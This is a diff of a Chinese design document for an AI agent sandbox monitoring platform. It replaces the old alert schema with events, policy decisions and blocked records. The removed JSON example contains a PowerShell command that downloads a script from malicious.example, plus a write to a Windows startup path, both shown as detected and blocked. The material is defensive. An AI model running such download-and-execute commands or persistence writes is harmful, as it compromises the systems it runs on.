@@ -266,7 +266,7 @@
   - 若任务参数中的中断原因仅为默认 `none`，平台会优先保留引擎执行层返回的非 `none` 原因，避免执行语义在 bridge 或 task-center 合并阶段被覆盖
   - `interruption_reason` 优先取任务参数中的审计值；若缺失则根据错误语义推断（如 timeout/budget），否则为 `none`
 - `static_analysis`：`details` 主要承载 `sample_name`、`language`、`entry_files`、`files_scanned`、`rule_hits`、`sensitive_capabilities`、`dependency_summary`
-- `sandbox_run`：`details` 主要承载 `session_id`、`target`、`alerts`、`blocked`、`event_count`
+- `sandbox_run`：`details` 主要承载 `session_id`、`target`、`events`、`policy_decisions`、`alerts`、`blocked_records`、`blocked`、`event_count`
 
 第一版共享规范化逻辑会剥离结果外层和 `details` 中未声明的私有字段，避免把引擎内部调试数据直接泄露到平台 API 或前端页面。
 
@@ -613,120 +613,174 @@
 }
 ```
 
-### 5.3 SandboxAlert
+### 5.3 SandboxRunResult (沙箱运行结果)
 
-`SandboxAlert` 在第一版中表示一次沙箱任务的告警结果对象，包含一个 `session_id` 及其下的多条告警记录。
+`SandboxRunResult` 在第一版中通过 `BaseResult.details` 承载沙箱会话的完整监督数据，包含事件流、策略决策、告警和阻断记录。
 
-#### 顶层字段定义
+#### 通用事件信封字段
 
 | 字段 | 类型 | 必填 | 含义 |
 | --- | --- | --- | --- |
-| `result_id` | string | 是 | 结果唯一标识 |
-| `task_id` | string | 是 | 关联任务 ID |
-| `task_type` | string | 是 | 固定为 `sandbox_run` |
-| `engine_type` | string | 是 | 固定为 `sandbox` |
-| `status` | string | 是 | 结果状态 |
-| `risk_level` | string | 是 | 汇总风险等级 |
-| `summary` | string | 是 | 结果摘要 |
-| `session_id` | string | 是 | 沙箱运行会话 ID |
-| `target` | object | 否 | 运行目标描述 |
-| `alerts` | array | 是 | 告警列表 |
-| `blocked` | boolean | 否 | 本次会话是否触发阻断 |
-| `event_count` | number | 否 | 总事件数 |
-| `created_at` | string | 是 | 结果创建时间 |
-| `updated_at` | string | 是 | 最近更新时间 |
-| `started_at` | string | 否 | 执行开始时间 |
-| `finished_at` | string | 否 | 执行完成时间 |
-| `metadata` | object | 否 | 沙箱结果扩展字段 |
+| `event_id` | string | 是 | 事件唯一标识 |
+| `session_id` | string | 是 | 沙箱会话 ID |
+| `sequence` | number | 是 | 事件序号（正整数，严格递增） |
+| `event_type` | string | 是 | 事件类型，见下方七类事件 |
+| `occurred_at` | string | 是 | 事件发生时间（ISO 8601） |
+| `source` | string | 是 | 事件来源：`model` / `agent` / `tool` / `policy` / `memory` / `monitor` |
+| `scenario_id` | string | 否 | 关联场景 ID |
+| `case_id` | string | 否 | 关联案例 ID |
+| `evidence_refs` | string[] | 是 | 证据引用列表 |
+| `payload` | object | 是 | 按事件类型承载不同负载 |
 
-#### alerts 子对象
+#### 七类事件类型
+
+| 事件类型 | 含义 | payload 关键字段 |
+| --- | --- | --- |
+| `model_input` | 模型输入事件 | `model_ref`, `content_ref`, `content_sha256`, `summary` |
+| `model_output` | 模型输出事件 | `model_ref`, `content_ref`, `content_sha256` |
+| `tool_request` | 工具请求事件 | `call_id`, `tool_name`, `target_ref`, `arguments_ref` |
+| `tool_result` | 工具结果事件 | `call_id`, `tool_name`, `status`, `result_ref`, `state_change` |
+| `policy_decision` | 策略决策事件 | `decision_id`, `subject_event_id`, `policy_id`, `action`, `reason_code`, `reason`, `decided_at` |
+| `memory_write` | 记忆写入事件 | `memory_entry_id`, `content_ref`, `content_sha256`, `summary` |
+| `memory_read` | 记忆读取事件 | `memory_entry_id`, `content_ref`, `content_sha256` |
+
+原始模型内容不直接跨越 shared 边界，而是通过 `content_ref`（内容引用）、`content_sha256`（SHA-256 摘要）和可选的 `summary` 字段表示。
+
+#### 四类策略动作
+
+| 动作 | 含义 | 说明 |
+| --- | --- | --- |
+| `allow` | 放行 | 允许操作继续执行 |
+| `deny` | 拒绝 | 拒绝操作并生成阻断记录 |
+| `ask` | 询问 | 需要人工或上级策略进一步判定 |
+| `alert` | 告警 | 允许操作但生成告警记录 |
+
+旧版 `action: "block"` 已废弃，替换为 `deny` 决策加关联 `blocked_records` 条目。
+
+#### PolicyDecision 字段
+
+| 字段 | 类型 | 必填 | 含义 |
+| --- | --- | --- | --- |
+| `decision_id` | string | 是 | 决策唯一标识 |
+| `subject_event_id` | string | 是 | 被裁决的事件 ID |
+| `policy_id` | string | 是 | 命中的策略 ID |
+| `action` | string | 是 | 策略动作，取值见上表 |
+| `reason_code` | string | 是 | 决策原因代码 |
+| `reason` | string | 是 | 决策原因描述 |
+| `evidence_refs` | string[] | 是 | 证据引用 |
+| `decided_at` | string | 是 | 决策时间（ISO 8601） |
+
+#### SandboxAlert 字段
 
 | 字段 | 类型 | 必填 | 含义 |
 | --- | --- | --- | --- |
 | `alert_id` | string | 是 | 告警唯一标识 |
-| `event_type` | string | 是 | 事件类型，例如 `command_execution` |
-| `action` | string | 是 | 系统动作，例如 `allow`、`alert`、`block` |
-| `resource` | string | 是 | 访问对象，例如文件、网络地址、命令 |
-| `evidence` | array | 否 | 证据列表 |
-| `timestamp` | string | 是 | 告警时间 |
+| `subject_event_id` | string | 是 | 被裁决的事件 ID |
+| `decision_id` | string | 是 | 关联决策 ID（action 必须为 `alert`） |
+| `risk_level` | string | 是 | 告警风险等级：`info` / `low` / `medium` / `high` / `critical` |
+| `category` | string | 是 | 告警分类 |
+| `title` | string | 是 | 告警标题 |
 | `reason` | string | 是 | 告警原因 |
-| `risk_level` | string | 是 | 告警等级 |
-| `policy_id` | string | 否 | 命中的策略 ID |
-| `policy_name` | string | 否 | 命中的策略名称 |
-| `process_name` | string | 否 | 触发事件的进程名 |
+| `evidence_refs` | string[] | 是 | 证据引用 |
+| `occurred_at` | string | 是 | 告警时间（ISO 8601） |
 
-#### evidence 子对象
+#### SandboxBlockedRecord 字段
 
 | 字段 | 类型 | 必填 | 含义 |
 | --- | --- | --- | --- |
-| `key` | string | 是 | 证据键 |
-| `value` | string | 是 | 证据值 |
+| `blocked_record_id` | string | 是 | 阻断记录唯一标识 |
+| `subject_event_id` | string | 是 | 被裁决的事件 ID |
+| `decision_id` | string | 是 | 关联决策 ID（action 必须为 `deny`） |
+| `resource_ref` | string | 否 | 被阻断的资源引用 |
+| `reason` | string | 是 | 阻断原因 |
+| `evidence_refs` | string[] | 是 | 证据引用 |
+| `occurred_at` | string | 是 | 阻断时间（ISO 8601） |
 
-#### JSON 示例
+#### 终态约束
+
+- 终态结果（`status` 为 `finished` 或 `blocked`）必须包含完整的 `events`、`policy_decisions`、`alerts`、`blocked_records` 集合。
+- `event_count` 必须等于 `events` 数组长度。
+- `blocked` 为 `true` 当且仅当 `blocked_records` 非空。
+- 每个 `alert` 决策必须至少有一个关联告警记录；每个 `deny` 决策必须至少有一个关联阻断记录。
+- `pending` 状态的沙箱结果壳子保持兼容，不要求完整监督数据。
+
+#### JSON 示例（blocked 结果）
 
 ```json
 {
-  "result_id": "result_sandbox_0001",
-  "task_id": "task_20260401_0003",
+  "task_id": "task_sandbox_001",
   "task_type": "sandbox_run",
   "engine_type": "sandbox",
   "status": "blocked",
   "risk_level": "critical",
-  "summary": "High-risk command execution was detected and blocked",
-  "session_id": "session_demo_001",
-  "target": {
-    "target_type": "session",
-    "target_value": "demo-agent-run",
-    "display_name": "Demo Agent Runtime Session"
+  "summary": "Sandbox blocked a tool request targeting an unapproved recipient",
+  "details": {
+    "session_id": "session_001",
+    "events": [
+      {
+        "event_id": "event_tool_001",
+        "session_id": "session_001",
+        "sequence": 1,
+        "event_type": "tool_request",
+        "occurred_at": "2026-06-27T08:00:01Z",
+        "source": "agent",
+        "evidence_refs": ["evidence://tool/request/001"],
+        "payload": {
+          "call_id": "call_001",
+          "tool_name": "send_email",
+          "target_ref": "recipient://outside.example",
+          "arguments_ref": "fixture://cases/T1-SC-002-C01/tool-request"
+        }
+      },
+      {
+        "event_id": "event_decision_001",
+        "session_id": "session_001",
+        "sequence": 2,
+        "event_type": "policy_decision",
+        "occurred_at": "2026-06-27T08:00:02Z",
+        "source": "policy",
+        "evidence_refs": ["evidence://decision/001"],
+        "payload": {
+          "decision_id": "decision_001",
+          "subject_event_id": "event_tool_001",
+          "policy_id": "policy_tool_target",
+          "action": "deny",
+          "reason_code": "target_not_approved",
+          "reason": "Target is outside the approved fixture set",
+          "evidence_refs": ["evidence://decision/001"],
+          "decided_at": "2026-06-27T08:00:02Z"
+        }
+      }
+    ],
+    "policy_decisions": [
+      {
+        "decision_id": "decision_001",
+        "subject_event_id": "event_tool_001",
+        "policy_id": "policy_tool_target",
+        "action": "deny",
+        "reason_code": "target_not_approved",
+        "reason": "Target is outside the approved fixture set",
+        "evidence_refs": ["evidence://decision/001"],
+        "decided_at": "2026-06-27T08:00:02Z"
+      }
+    ],
+    "alerts": [],
+    "blocked_records": [
+      {
+        "blocked_record_id": "blocked_001",
+        "subject_event_id": "event_tool_001",
+        "decision_id": "decision_001",
+        "resource_ref": "recipient://outside.example",
+        "reason": "Policy denied the target",
+        "evidence_refs": ["evidence://blocked/001"],
+        "occurred_at": "2026-06-27T08:00:02Z"
+      }
+    ],
+    "blocked": true,
+    "event_count": 2
   },
-  "alerts": [
-    {
-      "alert_id": "alert_0001",
-      "event_type": "command_execution",
-      "action": "block",
-      "resource": "cmd.exe /c powershell Invoke-WebRequest http://malicious.example/payload.ps1",
-      "evidence": [
-        {
-          "key": "process_tree",
-          "value": "agent.exe -> cmd.exe -> powershell.exe"
-        },
-        {
-          "key": "destination",
-          "value": "http://malicious.example/payload.ps1"
-        }
-      ],
-      "timestamp": "2026-04-01T11:00:12Z",
-      "reason": "Untrusted runtime attempted to download and execute a remote script",
-      "risk_level": "critical",
-      "policy_id": "SB-POL-001",
-      "policy_name": "block-remote-script-execution",
-      "process_name": "powershell.exe"
-    },
-    {
-      "alert_id": "alert_0002",
-      "event_type": "file_write",
-      "action": "alert",
-      "resource": "C:\\Users\\Public\\startup.bat",
-      "evidence": [
-        {
-          "key": "write_mode",
-          "value": "create"
-        }
-      ],
-      "timestamp": "2026-04-01T11:00:08Z",
-      "reason": "Suspicious write to startup path",
-      "risk_level": "high",
-      "policy_id": "SB-POL-010",
-      "policy_name": "monitor-startup-path-write",
-      "process_name": "agent.exe"
-    }
-  ],
-  "blocked": true,
-  "event_count": 17,
-  "created_at": "2026-04-01T11:00:00Z",
-  "updated_at": "2026-04-01T11:00:15Z",
-  "started_at": "2026-04-01T10:59:56Z",
-  "finished_at": "2026-04-01T11:00:14Z"
+  "created_at": "2026-06-27T08:00:00Z",
+  "updated_at": "2026-06-27T08:00:01Z"
 }
 ```
 
@@ -1214,18 +1268,26 @@ FOFA dev 侧接入示例：
 | 字段 | 含义 |
 | --- | --- |
 | `session_id` | 沙箱执行会话 ID |
-| `alerts` | 告警列表 |
+| `events` | 行为事件列表（七类事件） |
+| `event_id` | 事件唯一标识 |
+| `sequence` | 事件序号 |
+| `event_type` | 运行时事件类型（七类） |
+| `source` | 事件来源（model/agent/tool/policy/memory/monitor） |
+| `evidence_refs` | 证据引用列表 |
+| `payload` | 事件负载（按类型区分） |
+| `policy_decisions` | 策略决策列表 |
+| `decision_id` | 决策唯一标识 |
+| `subject_event_id` | 被裁决的事件 ID |
+| `action` | 策略动作（allow/deny/ask/alert） |
+| `reason_code` | 决策原因代码 |
+| `decided_at` | 决策时间 |
+| `alerts` | 告警记录列表 |
 | `alert_id` | 告警 ID |
-| `event_type` | 运行时事件类型 |
-| `action` | 平台或沙箱采取的动作 |
-| `resource` | 被访问的资源 |
-| `evidence` | 证据列表 |
-| `timestamp` | 告警时间 |
-| `reason` | 告警原因 |
-| `blocked` | 是否发生阻断 |
-| `event_count` | 会话内事件总数 |
-| `policy_id` | 命中的策略 ID |
-| `policy_name` | 命中的策略名称 |
+| `blocked_records` | 阻断记录列表 |
+| `blocked_record_id` | 阻断记录 ID |
+| `resource_ref` | 被阻断资源引用 |
+| `blocked` | 是否发生阻断（blocked_records 非空时为 true） |
+| `event_count` | 会话内事件总数（须等于 events.length） |
 
 ## 9. 后续演进建议
 
